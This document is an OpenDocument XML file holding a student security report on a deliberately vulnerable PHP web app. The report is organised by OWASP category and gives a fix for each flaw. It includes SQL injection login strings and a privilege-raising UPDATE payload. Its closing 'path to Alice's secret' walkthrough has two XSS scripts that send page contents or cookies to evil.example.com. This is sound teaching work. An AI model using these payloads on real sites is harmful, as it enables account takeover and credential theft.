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fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic"/>
    </style:style>
    <style:style style:name="T3" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic"/>
    </style:style>
    <style:style style:name="T4" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic"/>
    </style:style>
    <style:style style:name="P5" style:parent-style-name="Textbody" style:family="paragraph">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic"/>
    </style:style>
    <style:style style:name="T6" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic"/>
    </style:style>
    <style:style style:name="T7" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic"/>
    </style:style>
    <style:style style:name="T8" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic"/>
    </style:style>
    <style:style style:name="T9" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic"/>
    </style:style>
    <style:style style:name="T10" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties style:font-name="Lucida Console"/>
    </style:style>
    <style:style style:name="T11" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T12" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T13" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T14" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T15" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T16" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="P17" style:parent-style-name="Normal" style:family="paragraph">
      <style:text-properties fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T18" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T19" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T20" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T21" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T22" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T23" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties fo:color="#24292E" fo:background-color="#FFFFFF" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T24" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties style:font-name="Lucida Console" fo:background-color="#CCCCCC"/>
    </style:style>
    <style:style style:name="T25" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties style:font-name="Lucida Console" fo:background-color="#CCCCCC"/>
    </style:style>
    <style:style style:name="T26" style:parent-style-name="Policepardéfaut" style:family="text">
      <style:text-properties style:font-name="Lucida Console" fo:background-color="#CCCCCC"/>
    </style:style>
    <style:style style:name="P27" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
    <style:style style:name="P28" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
    <style:style style:name="P29" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
    <style:style style:name="P30" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
    <style:style style:name="P31" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
    <style:style style:name="P32" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
    <style:style style:name="P33" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
    <style:style style:name="P34" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000"/>
    </style:style>
    <style:style style:name="P35" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
    <style:style style:name="P36" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
    <style:style style:name="P37" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
    <style:style style:name="P38" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
    <style:style style:name="P39" style:parent-style-name="Textbody" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" fo:font-style="italic" style:font-style-asian="italic" fo:color="#000000" fo:background-color="#C0C0C0"/>
    </style:style>
  </office:automatic-styles>
  <office:body>
    <office:text text:use-soft-page-breaks="true">
      <text:p text:style-name="P1">Report</text:p>
      <text:h text:style-name="Titre1" text:outline-level="1">Introduced vulnerabilities</text:h>
      <text:h text:style-name="Titre2" text:outline-level="2">A1 – SQL Injection</text:h>
      <text:p text:style-name="Textbody">We use a MySQL database to handle the connections. In the vulnerable version we just append the user’s input onto the SQL request<text:s/>without check them, so we are vulnerable to SQL injections.</text:p>
      <text:p text:style-name="Textbody">Code: In the file authentication.php, at line 6, we send the username and password that the user entered to the getResultLogin() function. This function is in getResultLogin.php where we can see at line 19 that we put directly the inputs into the sql query.</text:p>
      <text:p text:style-name="Textbody">In the index.html page, an attacker can input “<text:span text:style-name="T2">Bob’; --<text:s/></text:span>” as username and something as password and it will connect as Bob. Then the attacker can get the password which is shown.</text:p>
      <text:p text:style-name="Textbody">Fix: In the secure version, we use prepare statement of mysqli which check and serialize data before sending them to the query so that we can’t perform SQL Injection.</text:p>
      <text:h text:style-name="Titre2" text:outline-level="2">A2 – Broken authentication</text:h>
      <text:p text:style-name="Textbody">The SQL injection vulnerability can be used to break the authentication like<text:s/>said before. But we can also break authentication by stealing cookies with CSRF attack. If an attacker gets cookies of Alice like we will see afterward, he can have the control of Alice’s account because we just check if the username and password that are<text:s/>in the cookies are correct.</text:p>
      <text:p text:style-name="Textbody">Code: all pages that require authentication use the function getResultLogin() which is in getResultLogin.php or getResultLoginSecure.php file (getResultLoginSecure.php file is the secure version of getResultLogin.php in term of<text:s/>SQL injection to force the counter group to follow the path described in the subject). We can see in these functions that we check the username and password and so, password is in a cookie.</text:p>
      <text:p text:style-name="Textbody">Fix: Fixing SQL injection and CSRF helps to fix this vulnerability. But we also changed the way to connect. Now when someone login with his username and password, we generate a token with one hour of validity and we store it in the cookie instead of password. To prevent from brute force attacks we wanted to implement a system that when we enter 5 successive wrong passwords, we block the connection for 2 minutes but because of time we didn’t implement it.</text:p>
      <text:h text:style-name="Titre2" text:outline-level="2">A3 – Sensitive Data Exposure</text:h>
      <text:p text:style-name="Textbody">Alice’s secret is not encrypted in Alice_secret.html file. Thus, everyone can see the secret if they know the link.</text:p>
      <text:p text:style-name="Textbody">Fix: We encrypt the secret with the Alice hashed password as key (Alice_secret.php). So, if an attacker wants to know the secret value, he needs to know the password of Alice. However, we also need to fix CSRF attack and XSS to fix this vulnerability.</text:p>
      <text:h text:style-name="Titre2" text:outline-level="2">A4 –<text:s/>XML external entities</text:h>
      <text:p text:style-name="Textbody">In the ask_vip.html page, we can insert inputs to ask invitation to become a vip member. By fill the form, you are redirect to ask_vip.php. In the page, we have a blacklist username and if the username<text:s/><text:soft-page-break/>input match with it, we don’t take the demand. Else, we create an xml document, parse it and send to the database. (we did not<text:s/>implement the<text:s/>parser,<text:s/>but we have the main idea).</text:p>
      <text:p text:style-name="Textbody">However, if an attacker wants to bypass this, he can fill the form in that way:</text:p>
      <text:p text:style-name="Textbody">Username:<text:s/><text:span text:style-name="T3">Alex</text:span></text:p>
      <text:p text:style-name="Textbody">Phone:<text:s/><text:span text:style-name="T4">1234567890</text:span></text:p>
      <text:p text:style-name="Textbody">Email:<text:s/></text:p>
      <text:p text:style-name="P5">evil@attack.com&lt;/email&gt;&lt;username&gt;evil&lt;/username&gt;&lt;phone&gt;1234567890&lt;/phone&gt;&lt;email&gt;evil@attack.com</text:p>
      <text:p text:style-name="Textbody">Here, when we will parse the xml document, username, phone and email will be erased by those the attacker put in the email field because they come after.</text:p>
      <text:p text:style-name="Textbody">Fix:<text:s/>In the secure version, we check and remove ‘&lt;’ and ‘&gt;’ characters from the inputs which prevent from enter xml element in form.</text:p>
      <text:p text:style-name="Textbody"/>
      <text:h text:style-name="Titre2" text:outline-level="2">A5 – Broken access control</text:h>
      <text:p text:style-name="Textbody">An attacker can use a SQL injection to gain VIP privilege. In our database, we have an attribute<text:s/><text:span text:style-name="T6">vip</text:span><text:s/>which can have value<text:s/><text:span text:style-name="T7">true</text:span><text:s/>or<text:s/><text:span text:style-name="T8">false</text:span>. If a user goes to vip_page.php without the right, he can’t access to the page. However, an attacker can insert SQL injection into the login page to modify the vip right of an account.</text:p>
      <text:p text:style-name="Textbody">For example, in the username input, an attacker can enter “<text:span text:style-name="T9">’; update user set vip=’true’ where username=’Bob’; --<text:s/></text:span>” and now, Bob has the right<text:s/>to go to vip page. We have modified privilege.</text:p>
      <text:p text:style-name="Textbody">We can imagine that our counter group use this attack to modify the password of Alice. But we use a hash function with a secret key. So, if they modify the password in the database without hash, they will not be able to connect as Alice because they don’t know the inverse image. In this case, Alice will not be able to connect but the attacker either (unless he find the hash key).</text:p>
      <text:p text:style-name="Textbody">Fix: by fixing sql injection we also fix this attack</text:p>
      <text:h text:style-name="Titre2" text:outline-level="2">A6 – Security Misconfiguration</text:h>
      <text:p text:style-name="Textbody">The user used to access the database has every rights which can lead to a lot of securities issues. We limited the potentials damages by only granting them the right to do<text:s/><text:span text:style-name="T10">SELECT</text:span><text:s/>operations.</text:p>
      <text:h text:style-name="Titre2" text:outline-level="2">A7 – XSS</text:h>
      <text:p text:style-name="Textbody">We have a guestbook (livre_d_or.php) that allows anybody to put messages. We do not do any sanitization, so an attacker can inject javascript.</text:p>
      <text:p text:style-name="Textbody">Fix: In order to prevent this<text:s/>attack, we encode html characters and we move the entire javascript into another file (livre_d_or.js) so that we can set the Same Content Policy to disable javascript in html.</text:p>
      <text:soft-page-break/>
      <text:h text:style-name="Titre2" text:outline-level="2">A8 – Insecure Deserialization</text:h>
      <text:p text:style-name="Textbody">Our cookies are easily to deserialize and read what is inside. So, if an attacker gets the password cookie of Alice, he can easily get the password.</text:p>
      <text:h text:style-name="Titre2" text:outline-level="2">A9 – Using Components with known vulnerabilities</text:h>
      <text:p text:style-name="Textbody">In the livre_d_or.php page, we use an external script gadget.js from evil.site.com. The script can have vulnerabilities that can hit our site. Moreover, in the same page we have a JavaScript vulnerability that this external script can use to attack us (see javascript vulnerability section).</text:p>
      <text:p text:style-name="Textbody">Fix: instead of using this script in script tag, we use import this script in a iframe which isolate it.</text:p>
      <text:h text:style-name="Titre2" text:outline-level="2">A10 – Insufficient logging monitoring</text:h>
      <text:p text:style-name="Textbody">We do not have any monitoring. In the secure version, we have logs when someone try to connect to an account. Thanks to that, we can detect brute force attack.</text:p>
      <text:h text:style-name="Titre2" text:outline-level="2">CSRF</text:h>
      <text:p text:style-name="Textbody">The identity of the<text:s/>user is done only via cookies, which mean we are vulnerable to CSRF attacks.</text:p>
      <text:h text:style-name="Titre2" text:outline-level="2">JavaScript vulnerability</text:h>
      <text:p text:style-name="Normal"><text:span text:style-name="T11">In livre_d_or.php page, in the<text:s/></text:span><text:span text:style-name="T12">saveCurrentDraftInput() function, we return<text:s/></text:span><text:span text:style-name="T13">this</text:span><text:span text:style-name="T14"><text:s/>and so the window object. It can be dangerous because we use an external script gadget.js which comes from evil.example.com. This script can write<text:s/></text:span><text:span text:style-name="T15">a = new saveCurrentDraftInput()<text:s/></text:span><text:span text:style-name="T16">and access to the window object which contains all information.</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="Normal"><text:span text:style-name="T18">Fix: we rem</text:span><text:span text:style-name="T19">ove the “</text:span><text:span text:style-name="T20">return this”</text:span><text:span text:style-name="T21"><text:s/>and we import the external script in an<text:s/></text:span><text:span text:style-name="T22">iframe</text:span><text:span text:style-name="T23"><text:s/>tag to isolate it from us.</text:span></text:p>
      <text:h text:style-name="Titre1" text:outline-level="1">Path to Alice’s secret</text:h>
      <text:p text:style-name="Textbody">1) go to the main page: index.html</text:p>
      <text:p text:style-name="Textbody">2) input<text:s/><text:span text:style-name="T24">Bob’<text:s/></text:span><text:span text:style-name="T25">‑</text:span><text:span text:style-name="T26">‑</text:span><text:s/>in the username field, and anything in the password field (but there has to be something).</text:p>
      <text:p text:style-name="Textbody">3) we arrive at authentication.php that displays Bob’s password. (if it’s Alice, it’s the hashed password)</text:p>
      <text:p text:style-name="Textbody">4) with Bob’s password, we login normally to Bob’s account on index.html.</text:p>
      <text:p text:style-name="Textbody">5) go to welcome.php.</text:p>
      <text:p text:style-name="Textbody">6) go to the guest book.</text:p>
      <text:p text:style-name="Textbody">7-1) enter this code as message in the guestbook, which is an XSS attack that will trigger an CSRF attack when anybody goes to the guestbook.</text:p>
      <text:p text:style-name="Textbody">Code:</text:p>
      <text:p text:style-name="P27">&lt;img src="" id="image"&gt;</text:p>
      <text:p text:style-name="P28">&lt;script&gt;</text:p>
      <text:p text:style-name="P29">const req = new XMLHttpRequest();</text:p>
      <text:p text:style-name="P30">req.open('GET',<text:s/>'http://localhost/project_vulnerable/welcome_page.php', false);</text:p>
      <text:soft-page-break/>
      <text:p text:style-name="P31">req.send(null);</text:p>
      <text:p text:style-name="P32">document.getElementById('image').src = "http://evil.example.com/?secret=" %2B req.responseText;</text:p>
      <text:p text:style-name="P33">&lt;/script&gt;</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="Textbody">This code gets the html code in the welcome page and send it to the attacker’s server through image attribute.</text:p>
      <text:p text:style-name="Textbody">7-2) enter a message containing script that get cookies and set them to the attacker’s server through image attribute.</text:p>
      <text:p text:style-name="Textbody">Code:</text:p>
      <text:p text:style-name="P35">&lt;img src="" id="image"&gt;</text:p>
      <text:p text:style-name="P36">&lt;script&gt;</text:p>
      <text:p text:style-name="P37">cookies =document.cookie;</text:p>
      <text:p text:style-name="P38">document.getElementById('image').src = "http://evil.example.com/?secret=" %2B cookies;</text:p>
      <text:p text:style-name="P39">&lt;/script&gt;</text:p>
      <text:p text:style-name="Textbody"/>
      <text:p text:style-name="Textbody">8) now we login to Alice’s account to simulate Alice’s connection on her own volition.</text:p>
      <text:p text:style-name="Textbody">9) go to the guestbook as Alice, that triggers the script.</text:p>
      <text:p text:style-name="Textbody">10) if we used 7-1, we have the URL to the secret service. Go to the link.</text:p>
      <text:p text:style-name="Textbody">If we used 7-2, we can easily deserialize cookies and get Alice’s password. Connect to the website with Alice’s credential, go to the welcome page and click on the link.</text:p>
      <text:p text:style-name="Textbody">11) The secret service<text:s/>does not need connection and the secret is in cle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en Degand</dc:creator>
    <meta:creation-date>2018-10-21T08:55:00Z</meta:creation-date>
    <dc:date>2018-10-24T09:17:00Z</dc:date>
    <meta:template xlink:href="Normal.dotm" xlink:type="simple"/>
    <meta:editing-cycles>40</meta:editing-cycles>
    <meta:editing-duration>PT9000S</meta:editing-duration>
    <meta:document-statistic meta:page-count="4" meta:paragraph-count="16" meta:word-count="1234" meta:character-count="8011" meta:row-count="56" meta:non-whitespace-character-count="6793"/>
  </office:meta>
</office:document-meta>
</file>